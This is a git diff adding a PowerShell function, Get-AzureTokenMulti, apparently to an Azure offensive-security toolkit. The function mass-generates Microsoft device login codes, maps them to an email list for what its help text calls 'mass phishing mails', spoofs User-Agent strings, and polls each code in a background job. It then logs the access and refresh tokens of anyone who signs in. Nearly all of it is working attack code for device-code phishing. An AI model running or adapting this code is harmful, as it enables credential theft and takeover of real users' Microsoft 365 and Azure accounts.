@@ -255,6 +255,237 @@ function Get-AzureToken {
         }
     }
 }
+
+function Get-AzureTokenMulti {
+    
+    <#
+    .DESCRIPTION
+        Generates multiple device codes to be used at https://www.microsoft.com/devicelogin. Each device code will be polled regularly in a separate thread. 
+        Once users have successfully authenticated, the JWT tokens will be stored in an array list $responses, each holding a similar structure as the $response variable returned by the Get-AzureToken command.
+    .EXAMPLE
+        Get-AzureTokenMulti -Client MSGraph -Count 50
+        # Generate 50 Device Codes and start 50 separate threads which will poll the status of the codes on a 5 second interval.
+    .EXAMPLE
+        Get-AzureTokenMulti -Client MSGraph -InputFile .\emails.txt -CodeFile DeviceCodes.csv
+        # Generate a device code for each email address in the emails.txt file, and save the device codes in a DeviceCodes.csv file which can be imported in a different tool to send mass phishing mails.
+    #>
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory=$True)]
+        [String[]]
+        [ValidateSet("Yammer","Outlook","MSTeams","Graph","AzureCoreManagement","AzureManagement","MSGraph","Custom","Substrate")]
+        $Client,
+        [Parameter(Mandatory=$False)]
+        [String]
+        $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",    
+        [Parameter(Mandatory=$False)]
+        [String]
+        $Resource = "https://graph.microsoft.com/",
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+        [String]$Device,
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+        [String]$Browser,
+        [Parameter(Mandatory=$False)]
+        [String]
+        $LogFile = "TokenLog.log",
+        [Parameter(Mandatory=$False)]
+        [String]
+        $CodeFile = "DeviceCodes.csv",
+        [Parameter(Mandatory=$False)]
+        [String]
+        $InputFile,
+        [Parameter(Mandatory=$False)]
+        [Int]
+        $Count = "10"
+    )
+    if ($Device) {
+		if ($Browser) {
+			$UserAgent = Forge-UserAgent -Device $Device -Browser $Browser
+		}
+		else {
+			$UserAgent = Forge-UserAgent -Device $Device
+		}
+	}
+	else {
+	   if ($Browser) {
+			$UserAgent = Forge-UserAgent -Browser $Browser 
+	   } 
+	   else {
+			$UserAgent = Forge-UserAgent
+	   }
+	}    
+    $Headers=@{}
+    $Headers["User-Agent"] = $UserAgent
+    $bodydict = @{
+        "Outlook" = @{
+            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "resource" =  "https://outlook.office365.com/"
+        }
+        "Substrate" = @{
+            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "resource" =  "https://substrate.office.com/"
+        }
+        "Yammer" = @{
+            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "resource" =  "https://www.yammer.com/"
+        }
+        "MSTeams" = @{
+            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "resource" =  "https://api.spaces.skype.com/"   
+        }
+        "Graph" = @{
+            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "resource" =  "https://graph.windows.net/"  
+        }
+        "MSGraph" = @{
+            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "resource" =  "https://graph.microsoft.com/"  
+        }
+        "AzureManagement" = @{
+            "client_id" = "84070985-06ea-473d-82fe-eb82b4011c9d"
+            "resource" =  "https://management.azure.com/"
+        }
+        "AzureCoreManagement" = @{
+            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "resource" =  "https://management.core.windows.net/"
+        }
+    }
+    if($Client -eq "Custom"){
+        $body = @{
+            "client_id" = $ClientID
+            "resource" =  $Resource
+        }
+    }else{
+        $body = $bodydict[$Client][0]
+    }
+    # Login Process
+    # If the $responses variable already exists, do nothing. Else, create an empty list.
+    if($responses.Count -eq 0){$global:responses = @()}
+    # Dictionary holding codes in format @{"usercode" = "devicecode"}
+    $DeviceCodes = @{}
+    $ValidCodes = @()
+    if(Test-Path $CodeFile){
+        Write-Host "Detected existing Device Code file at '$CodeFile'. Removing it first."
+        Remove-Item $CodeFile
+    # If an input file is provided, load all emails in a list and set the $Count to the amount of email addresses
+    if($InputFile -and (Test-Path $InputFile)){
+        $emails = Get-Content $InputFile
+        $Count = $emails.Count
+        }
+    }
+    # Request $Count amount of device codes and store them in the $DeviceCodes dictionary
+    for ($i =  1; $i -le $Count; $i++){
+        $authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Headers $Headers -Body $body -ErrorAction SilentlyContinue
+        Write-Verbose $authResponse
+        $interval = $authResponse.interval # Should always be 5 seconds
+        $expires =  $authResponse.expires_in # Should always be 900 seconds
+        $DeviceCodes += @{$authResponse.user_code = $authResponse.device_code}
+        # If an input list is used, output the usercodes in a csv ($CodeFile) of format "email,usercode"
+        if($emails){
+            Add-Content $CodeFile "$($emails[$i-1]),$($authResponse.user_code)"
+        }
+        Write-Progress -Activity "Generating Device Codes" -Status "$($authResponse.user_code)" -PercentComplete (($i/$Count)*100)
+    }
+    Write-Progress -Activity "Generating Device Codes" -Status "Done" -Completed
+    Write-Output "Device Codes: `n$($DeviceCodes.Keys)"
+    # If no input list is used, just store all usercodes in the $CodeFile file
+    if(-not $emails){
+        $DeviceCodes.Keys | Out-File $CodeFile
+    }
+    Write-Output "$Count device codes saved to '$CodeFile'. They are valid for $($expires/60) minutes!"
+    # Create a thread for each devicecode to poll the status for each code every $interval seconds
+    foreach ($code in $DeviceCodes.GetEnumerator()){
+        $job = Start-Job -ArgumentList @($code,$ClientID,$interval,$expires) -Name "DeviceCode-$($code.Key)" -Scriptblock {
+            Param(
+            $code,
+            [String]$ClientID,
+            [Int]$interval,
+            [Int]$expires
+            )
+            $continue = $True
+            While($continue){
+                Start-Sleep -Seconds $interval
+                $total += $interval
+                # If the expiry time has been exceeded, return with no data
+                if($total -gt $expires)
+                {
+                    return
+                }
+                # Try to get the response. Will give 40x while pending so we need to try&catch
+                try
+                {
+                    $body=@{
+                        "client_id" =  $ClientID
+                        "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
+                        "code" =       $code.Value
+                    }
+                    $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body -ErrorAction SilentlyContinue
+                }
+                catch
+                {
+                    # This is normal flow, always returns 40x unless successful
+                    $details=$_.ErrorDetails.Message | ConvertFrom-Json
+
+                    if($details.error -ne "authorization_pending")
+                    {
+                        # This is a real error
+                        Write-Error $details.error
+                        Write-Error $details.error_description
+                        return
+                    }
+                }
+
+                # If we got response, stop the thread and return a dictionary containing the code and the response
+                if($response)
+                {
+                    return @{
+                        "response"= $response
+                        "code"= $code
+                    }
+                }
+            }
+            return
+        }
+        Write-Progress -Activity "Starting threads" -Status "DeviceCode-$($code.Key)" -PercentComplete (((($DeviceCodes.GetEnumerator().Name.IndexOf($code.Key))+1)/$DeviceCodes.Count)*100)
+    }
+    Write-Progress -Activity "Starting threads" -Status "Started all $($DeviceCodes.Count) threads" -Completed
+    try{
+        # Loop until all threads have completed (successful or expired)
+        While((Get-Job -Name "DeviceCode-*").Count -ne 0){
+            # Write the status of the codes every 5 seconds
+            Start-Sleep 5
+            Write-Output "Status: $($ValidCodes.Count)/$Count"
+            # Remove completed jobs without data left
+            Get-Job -HasMoreData $False -Name "DeviceCode-*" | ?{$_.State -eq "Completed"} | %{Remove-Job $_}
+            # Check completed jobs with data
+            Get-Job -HasMoreData $True -Name "DeviceCode-*" | ?{$_.State -eq "Completed"} | %{
+                $output = Receive-Job $_
+                if ($output -eq $null){return} # Thread without output (error or timeout). Exit foreach for this job.
+                $response = $output["response"]
+                $code = $output["code"].Key
+                $global:responses += $response
+                $ValidCodes += $code
+                $target = (Parse-JWTtoken -token $response.access_token).unique_name
+                write-output "Got a response for code '$($code)' by '$target'!"
+                write-output "Access with `$responses[$($responses.Count -1)]"
+                write-output $response
+                "-------------------- Token - $($code) - $target --------------------" |Out-File -Append $LogFile
+                "Scope: $($response.scope)" | Out-File -Append $LogFile
+                "Resource: $($response.resource)" | Out-File -Append $LogFile
+                "Access Token: $($response.access_token)" | Out-File -Append $LogFile
+                "Refresh Token: $($response.refresh_token)" | Out-File -Append $LogFile
+            }
+        }
+        Write-Host "All codes expired." 
+    }finally{
+        # Forcefully kill all jobs when the script ends
+        Write-Host "Killing all threads before stopping."
+        Get-Job -Name "DeviceCode-*" | %{Remove-Job $_ -Force}
+    }
+
+}
 # Refresh Token Functions
 function RefreshTo-SubstrateToken {
     <#
